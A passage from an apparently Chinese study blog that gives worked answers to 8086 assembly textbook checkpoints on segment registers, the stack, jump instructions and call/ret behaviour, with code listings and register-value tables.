 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>:<span class="number">0000</span> <span class="number">70</span> <span class="number">80</span> F0 <span class="number">30</span> EF <span class="number">60</span> <span class="number">30</span> E2-<span class="number">00</span> <span class="number">80</span> <span class="number">80</span> <span class="number">12</span> <span class="number">66</span> <span class="number">20</span> <span class="number">22</span> <span class="number">60</span></span><br><span class="line"><span class="number">0000</span>:<span class="number">0010</span> <span class="number">62</span> <span class="number">26</span> E6 D6 CC 2E 3C 3B-AB BA <span class="number">00</span> <span class="number">00</span> <span class="number">26</span> <span class="number">06</span> <span class="number">66</span> <span class="number">88</span></span><br></pre></td></tr></table></figure>
<p> 下面的程序执行前，AX=0，BX=0，写出每条汇编指令执行完后相关寄存器中的值。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="number">0000</span>]			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, [<span class="number">0001</span>]			<span class="built_in">BX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="number">0000</span>]			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, [<span class="number">0002</span>]			<span class="built_in">BX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, [<span class="number">0004</span>]			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span>			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="number">0002</span>]			<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span>			<span class="built_in">BX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, [000C]			<span class="built_in">BX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">bl</span>			<span class="built_in">AX</span> =</span><br></pre></td></tr></table></figure>
<p> 提示，注意ds的设置。</p>
<p> 2662H    E626H    E626H    2662H    D6E6H    FD48H    2C14H    0    00E6H    0    0026H    000CH</p>
</li>
<li>内存中的情况如图3.6所示。<br> 各寄存器的初始值：CS=2000H，IP=0，DS=1000H，AX=0，BX=0；<br> (1)写出CPU执行的指令序列（用汇编指令写出）<br> (2)写出CPU执行每条指令后，CS、IP和相关寄存器中的数值。<br> (3)再次体会：数据和程序有区别吗？如何确定内存中的信息哪些是数据，哪些是程序？</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">CS:IP</th>
<th style="text-align:center">DS</th>
<th style="text-align:center">AX</th>
<th style="text-align:center">BX</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">mov ax, 6622H</td>
<td style="text-align:center">2000:3</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">6622H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">jmp 0ff0:0100</td>
<td style="text-align:center">2000:8-&gt;0ff0:0100</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">6622H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, 2000H</td>
<td style="text-align:center">0ff0:0103</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ds, ax</td>
<td style="text-align:center">0ff0:0105</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, [0008]</td>
<td style="text-align:center">0ff0:0108</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">C389H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, [0002]</td>
<td style="text-align:center">0ff0:010B</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">EA66H</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<p>程序和数据没有区别，本质上都是二进制01码，关键在于CPU如何解读。</p>
<h3 id="检测点-3-2"><a href="#检测点-3-2" class="headerlink" title="检测点 3.2"></a>检测点 3.2</h3><ol>
<li><p>补全下面的程序，使其可以将10000H～1000FH中的8个字，逆序复制到20000H～2000FH中。逆序复制的含义如图3.17所示（图中内存里的数据均为假设）。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">__________</span><br><span class="line">__________</span><br><span class="line">__________</span><br><span class="line"><span class="keyword">push</span> [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span> [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">push</span> [<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span> [<span class="number">6</span>]</span><br><span class="line"><span class="keyword">push</span> [<span class="number">8</span>]</span><br><span class="line"><span class="keyword">push</span> [A]</span><br><span class="line"><span class="keyword">push</span> [C]</span><br><span class="line"><span class="keyword">push</span> [E]</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0010H</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>补全下面的程序，使其可以将10000H～1000FH中的8个字，逆序复制到20000H～2000FH中。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">__________</span><br><span class="line">__________</span><br><span class="line">__________</span><br><span class="line"><span class="keyword">pop</span> [E]</span><br><span class="line"><span class="keyword">pop</span> [C]</span><br><span class="line"><span class="keyword">pop</span> [A]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">8</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">6</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">4</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第六章-包含多个段的程序"><a href="#第六章-包含多个段的程序" class="headerlink" title="第六章 包含多个段的程序"></a>第六章 包含多个段的程序</h2><h3 id="检测点-6-1"><a href="#检测点-6-1" class="headerlink" title="检测点 6.1"></a>检测点 6.1</h3><ol>
<li><p>下面的程序实现依此用内存0:0-0:15单元中的内容改写程序中的数据，完成程序：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line"></span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="built_in">bx</span>]</span><br><span class="line">	_________</span><br><span class="line">	<span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">cs</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>下面的程序实现依此用内存0:0-0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置在程序内。完成程序：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line">	<span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>, ____</span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">push</span> [<span class="built_in">bx</span>]</span><br><span class="line">	____________</span><br><span class="line">	<span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cs</span></span><br><span class="line"><span class="number">24h</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cs</span>:[<span class="built_in">bx</span>]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第九章-转移指令的原理"><a href="#第九章-转移指令的原理" class="headerlink" title="第九章 转移指令的原理"></a>第九章 转移指令的原理</h2><h3 id="检测点-9-1"><a href="#检测点-9-1" class="headerlink" title="检测点 9.1"></a>检测点 9.1</h3><ol>
<li><p>程序如下</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">	___________</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">jmp</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">bx</span>+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> 若要使程序中的jmp指令执行后，CS:IP指向程序的第一条指令，在data段中应该定义哪些数据？<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>程序如下</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">dd</span> <span class="number">12345678H</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> [<span class="built_in">bx</span>], ____</span><br><span class="line">	<span class="keyword">mov</span> [<span class="built_in">bx</span> + <span class="number">2</span>], ____</span><br><span class="line">	<span class="keyword">jmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> 补全程序，使jmp指令执行后，CS:IP指向程序的第一条指令。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bx</span></span><br><span class="line"><span class="built_in">cs</span></span><br></pre></td></tr></table></figure>
<p> 注意：bx指向低位，bx+2指向高位，低位为IP，而高位为CS。</p>
</li>
<li><p>用Debug查看内存，结果如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2000</span>:<span class="number">1000</span> BE <span class="number">00</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ......</span><br></pre></td></tr></table></figure>
<p> 则此时，CPU执行指令：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">1000H</span>]</span><br></pre></td></tr></table></figure>
<p> 后，(CS)=?，(IP)=?<br> 答案：<br> (CS)=0006，(IP)=00BE</p>
</li>
</ol>
<h3 id="检测点-9-2"><a href="#检测点-9-2" class="headerlink" title="检测点 9.2"></a>检测点 9.2</h3><p>补全编程，利用jcxz指令，实现在内存2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存储在dx中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">s:</span>	__________</span><br><span class="line">	__________</span><br><span class="line">	__________</span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">jmp</span> short s</span><br><span class="line"><span class="symbol">ok:</span>	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span> <span class="comment">;注意这一步的必要性</span></span><br><span class="line"><span class="keyword">jcxz</span> ok</span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></span><br></pre></td></tr></table></figure></p>
<h3 id="检测点-9-3"><a href="#检测点-9-3" class="headerlink" title="检测点 9.3"></a>检测点 9.3</h3><p>补全编程，利用loop指令，实现在内存的2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存储在dx中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">bx</span>]</span><br><span class="line">	<span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></span><br><span class="line">	_________</span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br><span class="line"><span class="symbol">ok:</span>	<span class="keyword">dec</span> <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">inc</span> <span class="built_in">cx</span> <span class="comment">;注意loop的工作原理</span></span><br></pre></td></tr></table></figure></p>
<h2 id="第十章-CALL和RET指令"><a href="#第十章-CALL和RET指令" class="headerlink" title="第十章 CALL和RET指令"></a>第十章 CALL和RET指令</h2><h3 id="检测点-10-1"><a href="#检测点-10-1" class="headerlink" title="检测点 10.1"></a>检测点 10.1</h3><p>补全程序，实现从内存1000：0000处开始执行指令。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">db</span> <span class="number">16</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,stack</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</span><br><span class="line">	<span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</span><br><span class="line">	<span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">retf</span></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1000h</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<h3 id="检测点-10-2"><a href="#检测点-10-2" class="headerlink" title="检测点 10.2"></a>检测点 10.2</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 00 00</td>
<td style="text-align:center">mov ax,0</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">e8 01 00</td>
<td style="text-align:center">call s</td>
</tr>
<tr>
<td style="text-align:center">1000:6</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:7</td>
<td style="text-align:center">58</td>
<td style="text-align:center">s:    pop ax</td>
</tr>
</tbody>
</table>
<p>ax中的数值为6，注意执行完call s后，IP先变为6，然后将IP的值压栈，最后跳转至s。</p>
<h3 id="检测点-10-3"><a href="#检测点-10-3" class="headerlink" title="检测点 10.3"></a>检测点 10.3</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 00 00</td>
<td style="text-align:center">mov ax,0</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">9a 09 00 00 10</td>
<td style="text-align:center">call far ptr s</td>
</tr>
<tr>
<td style="text-align:center">1000:8</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:9</td>
<td style="text-align:center">58</td>
<td style="text-align:center">s:    pop ax</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">add ax,ax</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">pop bx</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">add ax,bx</td>
</tr>
</tbody>
</table>
<p>ax中的数值为1010H，注意执行完call far ptr s后，IP先变为8，然后将CS、IP的值分别为1000和8依此压栈，最后再跳转至s继续执行。</p>
<h3 id="检测点-10-4"><a href="#检测点-10-4" class="headerlink" title="检测点 10.4"></a>检测点 10.4</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 06 00</td>
<td style="text-align:center">mov ax,6</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">ff d0</td>
<td style="text-align:center">call ax</td>
</tr>
<tr>
<td style="text-align:center">1000:5</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:6</td>
<td style="text-align:center">58</td>
<td style="text-align:center">mov bp,sp</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">add ax,[bp]</td>
</tr>
</tbody>
</table>
<p>ax中的数值为0BH，分析方法类似检测点10.2</p>
<h3 id="检测点-10-5"><a href="#检测点-10-5" class="headerlink" title="检测点 10.5"></a>检测点 10.5</h3><ol>
<li><p>下面的程序执行后，ax中的数值为多少？</p>
